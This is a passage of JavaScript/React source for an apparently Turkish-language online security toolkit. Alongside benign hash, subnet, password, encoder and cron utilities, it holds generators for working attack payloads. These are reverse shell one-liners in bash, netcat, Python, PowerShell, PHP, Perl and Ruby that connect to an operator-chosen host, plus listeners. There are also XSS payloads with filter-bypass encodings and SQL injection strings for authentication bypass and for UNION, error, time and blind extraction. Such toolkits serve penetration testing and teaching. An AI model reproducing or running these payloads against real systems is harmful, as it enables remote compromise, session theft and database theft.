  var S11=7, S12=12, S13=17, S14=22;
  var S21=5, S22=9 , S23=14, S24=20;
  var S31=4, S32=11, S33=16, S34=23;
  var S41=6, S42=10, S43=15, S44=21;
  string = Utf8Encode(string);
  x = ConvertToWordArray(string);
  a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476;
  for (k=0;k<x.length;k+=16) {
    AA=a; BB=b; CC=c; DD=d;
    a=FF(a,b,c,d,x[k+0], S11,0xD76AA478);
    d=FF(d,a,b,c,x[k+1], S12,0xE8C7B756);
    c=FF(c,d,a,b,x[k+2], S13,0x242070DB);
    b=FF(b,c,d,a,x[k+3], S14,0xC1BDCEEE);
    a=FF(a,b,c,d,x[k+4], S11,0xF57C0FAF);
    d=FF(d,a,b,c,x[k+5], S12,0x4787C62A);
    c=FF(c,d,a,b,x[k+6], S13,0xA8304613);
    b=FF(b,c,d,a,x[k+7], S14,0xFD469501);
    a=FF(a,b,c,d,x[k+8], S11,0x698098D8);
    d=FF(d,a,b,c,x[k+9], S12,0x8B44F7AF);
    c=FF(c,d,a,b,x[k+10],S13,0xFFFF5BB1);
    b=FF(b,c,d,a,x[k+11],S14,0x895CD7BE);
    a=FF(a,b,c,d,x[k+12],S11,0x6B901122);
    d=FF(d,a,b,c,x[k+13],S12,0xFD987193);
    c=FF(c,d,a,b,x[k+14],S13,0xA679438E);
    b=FF(b,c,d,a,x[k+15],S14,0x49B40821);
    a=GG(a,b,c,d,x[k+1], S21,0xF61E2562);
    d=GG(d,a,b,c,x[k+6], S22,0xC040B340);
    c=GG(c,d,a,b,x[k+11],S23,0x265E5A51);
    b=GG(b,c,d,a,x[k+0], S24,0xE9B6C7AA);
    a=GG(a,b,c,d,x[k+5], S21,0xD62F105D);
    d=GG(d,a,b,c,x[k+10],S22,0x2441453);
    c=GG(c,d,a,b,x[k+15],S23,0xD8A1E681);
    b=GG(b,c,d,a,x[k+4], S24,0xE7D3FBC8);
    a=GG(a,b,c,d,x[k+9], S21,0x21E1CDE6);
    d=GG(d,a,b,c,x[k+14],S22,0xC33707D6);
    c=GG(c,d,a,b,x[k+3], S23,0xF4D50D87);
    b=GG(b,c,d,a,x[k+8], S24,0x455A14ED);
    a=GG(a,b,c,d,x[k+13],S21,0xA9E3E905);
    d=GG(d,a,b,c,x[k+2], S22,0xFCEFA3F8);
    c=GG(c,d,a,b,x[k+7], S23,0x676F02D9);
    b=GG(b,c,d,a,x[k+12],S24,0x8D2A4C8A);
    a=HH(a,b,c,d,x[k+5], S31,0xFFFA3942);
    d=HH(d,a,b,c,x[k+8], S32,0x8771F681);
    c=HH(c,d,a,b,x[k+11],S33,0x6D9D6122);
    b=HH(b,c,d,a,x[k+14],S34,0xFDE5380C);
    a=HH(a,b,c,d,x[k+1], S31,0xA4BEEA44);
    d=HH(d,a,b,c,x[k+4], S32,0x4BDECFA9);
    c=HH(c,d,a,b,x[k+7], S33,0xF6BB4B60);
    b=HH(b,c,d,a,x[k+10],S34,0xBEBFBC70);
    a=HH(a,b,c,d,x[k+13],S31,0x289B7EC6);
    d=HH(d,a,b,c,x[k+0], S32,0xEAA127FA);
    c=HH(c,d,a,b,x[k+3], S33,0xD4EF3085);
    b=HH(b,c,d,a,x[k+6], S34,0x4881D05);
    a=HH(a,b,c,d,x[k+9], S31,0xD9D4D039);
    d=HH(d,a,b,c,x[k+12],S32,0xE6DB99E5);
    c=HH(c,d,a,b,x[k+15],S33,0x1FA27CF8);
    b=HH(b,c,d,a,x[k+2], S34,0xC4AC5665);
    a=II(a,b,c,d,x[k+0], S41,0xF4292244);
    d=II(d,a,b,c,x[k+7], S42,0x432AFF97);
    c=II(c,d,a,b,x[k+14],S43,0xAB9423A7);
    b=II(b,c,d,a,x[k+5], S44,0xFC93A039);
    a=II(a,b,c,d,x[k+12],S41,0x655B59C3);
    d=II(d,a,b,c,x[k+3], S42,0x8F0CCC92);
    c=II(c,d,a,b,x[k+10],S43,0xFFEFF47D);
    b=II(b,c,d,a,x[k+1], S44,0x85845DD1);
    a=II(a,b,c,d,x[k+8], S41,0x6FA87E4F);
    d=II(d,a,b,c,x[k+15],S42,0xFE2CE6E0);
    c=II(c,d,a,b,x[k+6], S43,0xA3014314);
    b=II(b,c,d,a,x[k+13],S44,0x4E0811A1);
    a=II(a,b,c,d,x[k+4], S41,0xF7537E82);
    d=II(d,a,b,c,x[k+11],S42,0xBD3AF235);
    c=II(c,d,a,b,x[k+2], S43,0x2AD7D2BB);
    b=II(b,c,d,a,x[k+9], S44,0xEB86D391);
    a=AddUnsigned(a,AA);
    b=AddUnsigned(b,BB);
    c=AddUnsigned(c,CC);
    d=AddUnsigned(d,DD);
  }
  var temp = WordToHex(a)+WordToHex(b)+WordToHex(c)+WordToHex(d);
  return temp.toLowerCase();
}

// 2. SHA digests wrapper using browser Web Crypto
async function getShaHash(algorithm, text) {
  try {
    const encoder = new TextEncoder();
    const data = encoder.encode(text);
    const hashBuffer = await crypto.subtle.digest(algorithm, data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  } catch (e) {
    return "Hata/Desteklenmiyor (HTTPS gereklidir)";
  }
}

// 3. Subnet utilities
const ipRegex = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
const ipToInt = ip => ip.split('.').reduce((acc, octet) => (acc * 256) + parseInt(octet, 10), 0) >>> 0;
const intToIp = num => [
  (num >>> 24) & 255,
  (num >>> 16) & 255,
  (num >>> 8) & 255,
  num & 255
].join('.');
const ipToBin = num => (num >>> 0).toString(2).padStart(32, '0');

function getIpClass(ip) {
  const firstOctet = parseInt(ip.split('.')[0], 10);
  if (firstOctet >= 1 && firstOctet <= 126) return 'A Sınıfı';
  if (firstOctet === 127) return 'Loopback (Geri Döngü)';
  if (firstOctet >= 128 && firstOctet <= 191) return 'B Sınıfı';
  if (firstOctet >= 192 && firstOctet <= 223) return 'C Sınıfı';
  if (firstOctet >= 224 && firstOctet <= 239) return 'D Sınıfı (Multicast)';
  if (firstOctet >= 240 && firstOctet <= 255) return 'E Sınıfı (Deneysel)';
  return 'Bilinmeyen';
}

function calculateSubnet(ipStr, cidr) {
  if (!ipRegex.test(ipStr)) {
    return { error: 'Geçersiz IP Adresi formatı! Örn: 192.168.1.1' };
  }
  const ipInt = ipToInt(ipStr);
  const netMask = cidr === 0 ? 0 : (~0 << (32 - cidr)) >>> 0;
  const netAddr = (ipInt & netMask) >>> 0;
  const broadAddr = (ipInt | ~netMask) >>> 0;
  
  let hostCount = Math.pow(2, 32 - cidr);
  let usableHosts = hostCount - 2;
  
  let firstUsable = (netAddr + 1) >>> 0;
  let lastUsable = (broadAddr - 1) >>> 0;
  
  if (cidr === 32) {
    usableHosts = 1;
    firstUsable = netAddr;
    lastUsable = netAddr;
  } else if (cidr === 31) {
    usableHosts = 2;
    firstUsable = netAddr;
    lastUsable = broadAddr;
  } else if (cidr === 0) {
    usableHosts = hostCount;
    firstUsable = 0;
    lastUsable = 0xFFFFFFFF;
  }
  
  return {
    netMask: intToIp(netMask),
    netAddr: intToIp(netAddr),
    broadAddr: intToIp(broadAddr),
    firstUsable: intToIp(firstUsable),
    lastUsable: intToIp(lastUsable),
    hostCount,
    usableHosts: usableHosts < 0 ? 0 : usableHosts,
    ipClass: getIpClass(ipStr),
    ipBin: ipToBin(ipInt),
    maskBin: ipToBin(netMask)
  };
}

// 4. Password Strength & Generator utilities
function formatTime(seconds) {
  if (seconds === Infinity || seconds > 1e30) return "Sonsuz Yıl";
  const years = seconds / (3600 * 24 * 365.25);
  if (years >= 1) {
    if (years > 1e9) return Math.round(years / 1e9) + " Milyar Yıl";
    if (years > 1e6) return Math.round(years / 1e6) + " Milyon Yıl";
    return Math.round(years).toLocaleString('tr-TR') + " Yıl";
  }
  const days = seconds / (3600 * 24);
  if (days >= 1) return Math.round(days) + " Gün";
  const hours = seconds / 3600;
  if (hours >= 1) return Math.round(hours) + " Saat";
  const minutes = seconds / 60;
  if (minutes >= 1) return Math.round(minutes) + " Dakika";
  return Math.round(seconds) + " Saniye";
}

function analyzePassword(pass) {
  if (!pass) return null;
  
  let pool = 0;
  const hasLower = /[a-z]/.test(pass);
  const hasUpper = /[A-Z]/.test(pass);
  const hasNumber = /[0-9]/.test(pass);
  const hasSymbol = /[^a-zA-Z0-9]/.test(pass);
  
  if (hasLower) pool += 26;
  if (hasUpper) pool += 26;
  if (hasNumber) pool += 10;
  if (hasSymbol) pool += 33;
  
  const len = pass.length;
  const entropy = pool > 0 ? len * (Math.log(pool) / Math.log(2)) : 0;
  
  let level = "Zayıf";
  let color = "text-red-500 border-red-500/20 bg-red-500/5";
  if (entropy >= 100) {
    level = "Askeri Düzeyde Güçlü 💎";
    color = "text-[#00ff88] border-[#00ff88]/20 bg-[#00ff88]/5";
  } else if (entropy >= 80) {
    level = "Güçlü 🛡️";
    color = "text-emerald-400 border-emerald-400/20 bg-emerald-400/5";
  } else if (entropy >= 60) {
    level = "Orta Seviye 🧐";
    color = "text-yellow-400 border-yellow-400/20 bg-yellow-400/5";
  } else if (entropy >= 40) {
    level = "Zayıf ⚠️";
    color = "text-orange-400 border-orange-400/20 bg-orange-400/5";
  } else {
    level = "Kritik Derecede Zayıf 🚨";
    color = "text-red-500 border-red-500/20 bg-red-500/5";
  }
  
  const combinations = Math.pow(pool, len);
  
  return {
    entropy: Math.round(entropy * 10) / 10,
    level,
    color,
    combinations,
    hasLower,
    hasUpper,
    hasNumber,
    hasSymbol,
    poolSize: pool,
    crackTimes: {
      online: combinations / 100,
      offlineSlow: combinations / 1e6,
      offlineFast: combinations / 1e10
    }
  };
}

function generatePassword(len, lower, upper, num, sym) {
  let chars = '';
  if (lower) chars += 'abcdefghijklmnopqrstuvwxyz';
  if (upper) chars += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  if (num) chars += '0123456789';
  if (sym) chars += '!@#$%^&*()_+-=[]{}|;:\',./<>?~`';
  
  if (!chars) return '';
  
  let res = '';
  const sets = [];
  if (lower) sets.push('abcdefghijklmnopqrstuvwxyz');
  if (upper) sets.push('ABCDEFGHIJKLMNOPQRSTUVWXYZ');
  if (num) sets.push('0123456789');
  if (sym) sets.push('!@#$%^&*()_+-=[]{}|;:\',./<>?~`');
  
  sets.forEach(set => {
    res += set[Math.floor(Math.random() * set.length)];
  });
  
  for (let i = res.length; i < len; i++) {
    res += chars[Math.floor(Math.random() * chars.length)];
  }
  
  return res.split('').sort(() => Math.random() - 0.5).join('');
}

// 5. Encoder/decoder functions
const handleEncode = (text, format) => {
  if (!text) return '';
  try {
    switch (format) {
      case 'base64':
        return btoa(unescape(encodeURIComponent(text)));
      case 'url':
        return encodeURIComponent(text);
      case 'hex':
        return [...text].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
      case 'binary':
        return [...text].map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
      case 'html':
        return text.replace(/[\u00A0-\u9999<>&]/gim, i => '&#' + i.charCodeAt(0) + ';');
      default:
        return text;
    }
  } catch (e) {
    return 'Hata: Kodlanamadı. ' + e.message;
  }
};

const handleDecode = (text, format) => {
  if (!text) return '';
  try {
    switch (format) {
      case 'base64':
        return decodeURIComponent(escape(atob(text.trim())));
      case 'url':
        return decodeURIComponent(text);
      case 'hex':
        const cleanHex = text.replace(/[^0-9a-fA-F]/g, '');
        const hexMatches = cleanHex.match(/.{1,2}/g);
        return hexMatches ? hexMatches.map(h => String.fromCharCode(parseInt(h, 16))).join('') : '';
      case 'binary':
        const cleanBin = text.replace(/[^01]/g, '');
        const binMatches = cleanBin.match(/.{1,8}/g);
        return binMatches ? binMatches.map(b => String.fromCharCode(parseInt(b, 2))).join('') : '';
      case 'html':
        const txt = document.createElement('textarea');
        txt.innerHTML = text;
        return txt.value;
      default:
        return text;
    }
  } catch (e) {
    return 'Hata: Kodu çözülemedi. Girdi formatının doğru olduğundan emin olun. (' + e.message + ')';
  }
};

// 6. Hash Detection
function detectHashType(hashStr) {
  const clean = hashStr.trim().toLowerCase();
  if (!clean) return null;
  
  const isHex = /^[0-9a-f]+$/.test(clean);
  const results = [];
  
  if (isHex) {
    const len = clean.length;
    if (len === 32) {
      results.push({ name: 'MD5', conf: 'Çok Yüksek', desc: '32 Karakter Hexadecimal hash. Genellikle MD5 algoritması tarafından üretilir. Günümüzde zayıf ve çarpışma (collision) saldırılarına açıktır.' });
      results.push({ name: 'MD4', conf: 'Düşük', desc: 'MD5\'in öncülü, tamamen güvensiz.' });
    } else if (len === 40) {
      results.push({ name: 'SHA-1', conf: 'Yüksek', desc: '40 Karakter Hexadecimal hash. SHA-1 algoritması tarafından üretilir. Güvenliği kırılmıştır, yeni projelerde kullanılmamalıdır.' });
    } else if (len === 56) {
      results.push({ name: 'SHA-224', conf: 'Yüksek', desc: '56 Karakter Hexadecimal hash. SHA-2 ailesinin bir parçasıdır.' });
      results.push({ name: 'SHA3-224', conf: 'Orta', desc: 'Keccak tabanlı yeni nesil SHA-3 hash algoritması.' });
    } else if (len === 64) {
      results.push({ name: 'SHA-256', conf: 'Çok Yüksek', desc: '64 Karakter Hexadecimal hash. Siber güvenlikte en yaygın kullanılan standart veri bütünlüğü algoritması.' });
      results.push({ name: 'SHA3-256', conf: 'Orta', desc: 'SHA-3 standardının 256-bit varyantı.' });
    } else if (len === 96) {
      results.push({ name: 'SHA-384', conf: 'Yüksek', desc: '96 Karakter Hexadecimal hash. Yüksek güvenlikli sistemler için SHA-2 varyantı.' });
    } else if (len === 128) {
      results.push({ name: 'SHA-512', conf: 'Yüksek', desc: '128 Karakter Hexadecimal hash. SHA-2 ailesinin en güçlü hash algoritması.' });
      results.push({ name: 'SHA3-512', conf: 'Orta', desc: 'SHA-3 standardının 512-bit varyantı.' });
      results.push({ name: 'Whirlpool', conf: 'Düşük', desc: '512-bitlik daha az yaygın kullanılan bir blok şifreleme tabanlı hash.' });
    } else if (len === 8) {
      results.push({ name: 'CRC-32', conf: 'Orta', desc: '8 Karakter Hexadecimal. Genellikle ağ paketlerinde hata tespiti için kullanılır, şifreleme amacı taşımaz.' });
    } else if (len === 16) {
      results.push({ name: 'MySQL323', conf: 'Düşük', desc: 'Eski MySQL parola hash formatı.' });
    }
  }
  
  if (clean.startsWith('$2a$') || clean.startsWith('$2b$') || clean.startsWith('$2y$')) {
    results.push({ name: 'Bcrypt', conf: 'Çok Yüksek', desc: 'Blowfish şifrelemesine dayalı yavaş ve güvenli parola hashing standardı. Salting işlemini otomatik içerir. Brute force saldırılarına karşı son derece dirençlidir.' });
  } else if (clean.startsWith('$argon2id$') || clean.startsWith('$argon2i$') || clean.startsWith('$argon2d$')) {
    results.push({ name: 'Argon2', conf: 'Çok Yüksek', desc: 'PHC yarışması birincisi olan en modern parola hashing standardı. Bellek-sert (memory-hard) yapısıyla GPU tabanlı brute-force saldırılarını engeller.' });
  } else if (clean.startsWith('$1$')) {
    results.push({ name: 'MD5-Crypt', conf: 'Yüksek', desc: 'MD5 tabanlı tuzlanmış (salted) eski UNIX parola hash biçimi.' });
  } else if (clean.startsWith('$5$')) {
    results.push({ name: 'SHA-256-Crypt', conf: 'Yüksek', desc: 'SHA-256 tabanlı tuzlanmış UNIX parola hash biçimi.' });
  } else if (clean.startsWith('$6$')) {
    results.push({ name: 'SHA-512-Crypt', conf: 'Yüksek', desc: 'SHA-512 tabanlı tuzlanmış UNIX parola hash biçimi.' });
  } else if (clean.startsWith('$apr1$')) {
    results.push({ name: 'Apache MD5', conf: 'Yüksek', desc: 'Apache htpasswd tarafından kullanılan MD5 varyantı.' });
  } else if (clean.startsWith('$pbkdf2$')) {
    results.push({ name: 'PBKDF2', conf: 'Yüksek', desc: 'HMAC tabanlı standart anahtar türetme fonksiyonu. Parola koruması için yaygındır.' });
  }
  
  if (results.length === 0) {
    results.push({ name: 'Bilinmeyen Format', conf: 'Belirsiz', desc: 'Girdiğiniz hash deseni bilinen standart uzunluklar veya önekler (prefix) ile eşleşmedi. Karakter seti: ' + (isHex ? 'Hexadecimal' : 'Base64/Diğer') + ', Uzunluk: ' + clean.length + ' karakter.' });
  }
  
  return results;
}

const formatBin = (binStr, cidr) => {
  let formatted = [];
  for (let i = 0; i < 32; i++) {
    if (i > 0 && i % 8 === 0) {
      formatted.push(<span key={'dot-' + i} className="text-[#5c8a74] mx-0.5">.</span>);
    }
    const isNet = i < cidr;
    formatted.push(
      <span key={i} className={isNet ? "text-[#00ff88] font-bold" : "text-[#547464]"}>
        {binStr[i]}
      </span>
    );
  }
  return formatted;
};

/* ============ TOOLS PAGE MAIN COMPONENT ============ */
const ToolsPage = ({ navigate, data }) => {
  const slug = data ? data.slug : null;
  const [copied, setCopied] = useState('');

  const handleCopy = (text, key) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(''), 2000);
  };

  const toolsList = [
    { slug: 'reverse-shell', name: 'Reverse Shell Oluşturucu', desc: 'IP ve port bilgilerini girerek Bash, Python, PHP ve PowerShell reverse shell komutlarını saniyeler içinde oluşturun.', icon: '🔌' },
    { slug: 'encoder-decoder', name: 'Cyber Encoder/Decoder', desc: 'Base64, Hex, Binary, URL ve HTML formatlarında metin şifreleme ve kod çözme işlemlerini gerçekleştirin.', icon: '🔐' },
    { slug: 'password-strength', name: 'Parola Entropi & Güvenlik', desc: 'Şifrenizin brute force (kaba kuvvet) kırılma süresini hesaplayın ve kriptografik güvenli parolalar üretin.', icon: '🔑' },
    { slug: 'subnet-calc', name: 'CIDR & Subnet Hesaplayıcı', desc: 'IP adresinizi ve alt ağ maskesini (CIDR) girerek alt ağ aralığını, ağ adresini, yayım adresini ve binary karşılığını analiz edin.', icon: '🌐' },
    { slug: 'hash-tool', name: 'Hash Oluşturucu & Tanımlayıcı', desc: 'Verilerinizin MD5, SHA-1, SHA-256 ve SHA-512 hash çıktılarını üretin ve bilinmeyen hash tiplerini otomatik tanımlayın.', icon: '🧮' },
    { slug: 'xss-generator', name: 'XSS Payload Oluşturucu', desc: 'HTML, SVG, Attribute ve filtre atlatma (WAF bypass) XSS saldırı kodlarını dinamik olarak üretin.', icon: '🧪' },
    { slug: 'sqli-generator', name: 'SQL Injection Jeneratörü', desc: 'DBMS türüne göre Union, Boolean, Time ve Auth bypass SQL Injection şablonlarını parametrik olarak oluşturun.', icon: '💉' },
    { slug: 'cron-explainer', name: 'Cron Zamanlayıcı & Açıklayıcı', desc: 'Cron zaman ifadelerini Türkçe doğal dilde analiz edin veya görsel kontrollerle sıfırdan cron ifadesi oluşturun.', icon: '⏰' },
    { slug: 'base64-file', name: 'Base64 Dosya Dönüştürücü', desc: 'Görselleri ve dosyaları tarayıcıda yerel olarak (sunucuya göndermeden) Base64 veri koduna dönüştürün.', icon: '📁' },
    { slug: 'dns-lookup', name: 'DNS & SPF DMARC Analizörü', desc: 'Cloudflare DoH üzerinden alan adlarının A, MX, TXT, SPF ve DMARC kayıtlarını sorgulayın ve e-posta güvenlik risklerini raporlayın.', icon: '📡' }
  ];

  const activeTool = toolsList.find(t => t.slug === slug);

  // States for Tool 1: Reverse Shell
  const [rsIp, setRsIp] = useState('10.10.10.10');
  const [rsPort, setRsPort] = useState('4444');
  const [rsShell, setRsShell] = useState('bash');
  const [rsListener, setRsListener] = useState('nc');

  const randomRsPort = () => {
    const port = Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
    setRsPort(port.toString());
  };

  // Shell payloads generator
  const getShellPayload = () => {
    const ip = rsIp.trim() || '10.10.10.10';
    const port = rsPort.trim() || '4444';
    switch (rsShell) {
      case 'bash':
        return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
      case 'bash-readline':
        return `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`;
      case 'nc':
        return `nc -e /bin/bash ${ip} ${port}`;
      case 'nc-openbsd':
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
      case 'python':
        return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
      case 'powershell':
        return `$L='${ip}';$P=${port};$C=New-Object System.Net.Sockets.TCPClient($L,$P);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($B,0,$I);$R=(iex $D 2>&1 | Out-String );$R2=$R + "PS " + (pwd).Path + "> ";$SB=([text.encoding]::ASCII).GetBytes($R2);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()`;
      case 'php':
        return `php -r '$sock=fsockopen("${ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
      case 'perl':
        return `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
      case 'ruby':
        return `ruby -rsocket -e'f=TCPSocket.open("${ip}",{port}).to_i;exec(sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f))'`;
      default:
        return '';
    }
  };

  const getListenerPayload = () => {
    const port = rsPort.trim() || '4444';
    switch (rsListener) {
      case 'nc':
        return `nc -lvnp ${port}`;
      case 'ncat':
        return `ncat -lvnp ${port}`;
      case 'rlwrap':
        return `rlwrap nc -lvnp ${port}`;
      case 'socat':
        return `socat file:\`tty\`,raw,echo=0 tcp-listen:${port}`;
      case 'powershell':
        return `PowerShell -NoP -Command "$S=New-Object System.Net.Sockets.TcpListener(${port});$S.Start();$C=$S.AcceptTcpClient();$St=$C.GetStream();$R=New-Object System.IO.StreamReader($St);$W=New-Object System.IO.StreamWriter($St);$W.AutoFlush=$true;while($C.Connected){$cmd=$R.ReadLine();if($cmd -eq 'exit'){$C.Close();break};try{$out=Invoke-Expression $cmd 2>&1 | Out-String}catch{$out=$_.Exception.Message};$W.WriteLine($out)}"`;
      default:
        return '';
    }
  };

  // States for Tool 2: Encoder/Decoder
  const [encText, setEncText] = useState('');
  const [encFormat, setEncFormat] = useState('base64');
  const [encMode, setEncMode] = useState('encode');
  const [encResult, setEncResult] = useState('');

  useEffect(() => {
    if (encMode === 'encode') {
      setEncResult(handleEncode(encText, encFormat));
    } else {
      setEncResult(handleDecode(encText, encFormat));
    }
  }, [encText, encFormat, encMode]);

  const swapEncoder = () => {
    setEncText(encResult);
    setEncMode(m => m === 'encode' ? 'decode' : 'encode');
  };

  // States for Tool 3: Password Analyzer & Gen
  const [passInput, setPassInput] = useState('');
  const [showPass, setShowPass] = useState(false);
  const [genLen, setGenLen] = useState(16);
  const [genLower, setGenLower] = useState(true);
  const [genUpper, setGenUpper] = useState(true);
  const [genNum, setGenNum] = useState(true);
  const [genSym, setGenSym] = useState(true);
  const [genResult, setGenResult] = useState('');

  const passAnalysis = analyzePassword(passInput);

  const handleGeneratePass = () => {
    const newPass = generatePassword(genLen, genLower, genUpper, genNum, genSym);
    setGenResult(newPass);
  };

  // States for Tool 4: Subnet Calc
  const [subnetIp, setSubnetIp] = useState('192.168.1.1');
  const [subnetCidr, setSubnetCidr] = useState(24);

  const subnetResult = calculateSubnet(subnetIp, subnetCidr);

  // States for Tool 5: Hash Generator & Detector
  const [hashInput, setHashInput] = useState('');
  const [hMd5, setHMd5] = useState('');
  const [hSha1, setHSha1] = useState('');
  const [hSha256, setHSha256] = useState('');
  const [hSha512, setHSha512] = useState('');
  const [detectInput, setDetectInput] = useState('');

  useEffect(() => {
    if (!hashInput) {
      setHMd5('');
      setHSha1('');
      setHSha256('');
      setHSha512('');
      return;
    }
    setHMd5(md5(hashInput));
    getShaHash('SHA-1', hashInput).then(setHSha1);
    getShaHash('SHA-256', hashInput).then(setHSha256);
    getShaHash('SHA-512', hashInput).then(setHSha512);
  }, [hashInput]);

  const detectedHashes = detectHashType(detectInput);

  // States for Tool 6: XSS Payload Generator
  const [xssPayloadType, setXssPayloadType] = useState('html');
  const [xssCustomParam, setXssCustomParam] = useState('alert(document.domain)');
  const [xssFilterBypass, setXssFilterBypass] = useState('none');

  const getXssPayload = () => {
    const custom = xssCustomParam.trim() || 'alert(document.domain)';
    let p = '';
    switch (xssPayloadType) {
      case 'html': p = `<script>${custom}</script>`; break;
      case 'img': p = `<img src="x" onerror="${custom}">`; break;
      case 'svg': p = `<svg onload="${custom}">`; break;
      case 'body': p = `<body onload="${custom}">`; break;
      case 'iframe': p = `<iframe src="javascript:${custom}">`; break;
      case 'attribute': p = `" onmouseover="${custom}" x="`; break;
      case 'javascript-context': p = `'-${custom}-'`; break;
      case 'polyglot': p = "jaVasCript:/*-/*\\\\`/*\\\\\"\\`/*'/*\"/**/(/* */" + custom + "/*\\\\`/*\\\\`/*\"/*/*/"; break;
      default: p = '';
    }
    if (xssFilterBypass === 'html-entity') {
      return p.split('').map(c => `&#${c.charCodeAt(0)};`).join('');
    } else if (xssFilterBypass === 'string-fromcharcode') {
      const cc = custom.split('').map(c => c.charCodeAt(0)).join(',');
      const wrapped = `eval(String.fromCharCode(${cc}))`;
      if (xssPayloadType === 'html') return `<script>${wrapped}</script>`;
      if (xssPayloadType === 'img') return `<img src="x" onerror="${wrapped}">`;
      if (xssPayloadType === 'svg') return `<svg onload="${wrapped}">`;
      if (xssPayloadType === 'body') return `<body onload="${wrapped}">`;
      if (xssPayloadType === 'iframe') return `<iframe src="javascript:${wrapped}">`;
      if (xssPayloadType === 'attribute') return `" onmouseover="${wrapped}" x="`;
      if (xssPayloadType === 'javascript-context') return `'-${wrapped}-'`;
      return wrapped;
    } else if (xssFilterBypass === 'url') {
      return encodeURIComponent(p);
    }
    return p;
  };

  // States for Tool 7: SQL Injection Generator
  const [sqliDbms, setSqliDbms] = useState('mysql');
  const [sqliType, setSqliType] = useState('auth');
  const [sqliCols, setSqliCols] = useState(5);
  const [sqliTable, setSqliTable] = useState('users');
  const [sqliDbName, setSqliDbName] = useState('database()');

  const getSqliPayload = () => {
    const colVal = parseInt(sqliCols) || 5;
    let p = '';
    switch (sqliType) {
      case 'auth':
        if (sqliDbms === 'mysql' || sqliDbms === 'postgresql') p = `' OR 1=1 -- -`;
        else if (sqliDbms === 'mssql') p = `' OR 1=1 --`;
        else p = `' OR 1=1;`;
        break;
      case 'union':
        const columnsArray = Array.from({ length: colVal }).map((_, i) => {
          if (i === 1) return sqliDbName || 'database()';
          return i + 1;
        });
        if (sqliDbms === 'mysql') p = `' UNION SELECT ${columnsArray.join(',')} -- -`;
        else if (sqliDbms === 'postgresql' || sqliDbms === 'mssql') p = `' UNION SELECT ${columnsArray.map(c => typeof c === 'string' ? c : 'NULL').join(',')} --`;
        else p = `' UNION SELECT ${columnsArray.join(',')} FROM dual --`;
        break;
      case 'error':
        if (sqliDbms === 'mysql') p = `' AND extractvalue(1, concat(0x3a, ${sqliDbName || 'database()'})) -- -`;
        else if (sqliDbms === 'postgresql') p = `' AND CAST((SELECT ${sqliDbName || 'database()'}) AS NUMERIC) --`;
        else if (sqliDbms === 'mssql') p = `' AND 1=Convert(int, (SELECT ${sqliDbName || 'database()'})) --`;
        else p = `' AND utl_inaddr.get_host_address((SELECT ${sqliDbName || 'database()'})) --`;
        break;
      case 'time':
        if (sqliDbms === 'mysql') p = `' AND SLEEP(5) -- -`;
        else if (sqliDbms === 'postgresql') p = `' AND pg_sleep(5) --`;
        else if (sqliDbms === 'mssql') p = `' AND WAITFOR DELAY '0:0:5' --`;
        else p = `' AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5) --`;
        break;
      case 'blind':
        if (sqliDbms === 'mysql') p = `' AND ascii(substring((${sqliDbName || 'database()'}),1,1)) > 64 -- -`;
        else p = `' AND ascii(substr((${sqliDbName || 'database()'}),1,1)) > 64 --`;
        break;
      default: p = '';
    }
    return p;
  };

  // States for Tool 8: Cron Explainer & Generator
  const [cronMin, setCronMin] = useState('*');
  const [cronHour, setCronHour] = useState('*');
  const [cronDay, setCronDay] = useState('*');
  const [cronMonth, setCronMonth] = useState('*');
  const [cronDow, setCronDow] = useState('*');
  const [cronManualInput, setCronManualInput] = useState('* * * * *');
  const [cronInputMode, setCronInputMode] = useState('interactive');

  useEffect(() => {
    if (cronInputMode === 'interactive') {
      setCronManualInput(`${cronMin} ${cronHour} ${cronDay} ${cronMonth} ${cronDow}`);
    }
  }, [cronMin, cronHour, cronDay, cronMonth, cronDow, cronInputMode]);

  const explainCron = (expr) => {
    const parts = expr.trim().split(/\s+/);
    if (parts.length < 5) return 'Geçersiz cron ifadesi. En az 5 sütun olmalı (Dakika, Saat, Gün, Ay, Haftanın Günü).';
    const [min, hour, day, month, dow] = parts;
    
    const explainField = (val, type) => {
      if (val === '*') return type === 'min' ? 'her dakika' : type === 'hour' ? 'her saat' : type === 'day' ? 'her gün' : type === 'month' ? 'her ay' : 'haftanın her günü';
      if (val.includes('/')) {
        const [start, step] = val.split('/');
        return `${step} bir ${type === 'min' ? 'dakikada' : type === 'hour' ? 'saatte' : type === 'day' ? 'günde' : type === 'month' ? 'ayda' : 'günde'}`;
      }
      if (val.includes(',')) {
        return `şu zamanlarda: ${val}`;
      }
      if (val.includes('-')) {
        return `${val.replace('-', ' ile ')} arası`;
      }
      if (type === 'dow') {
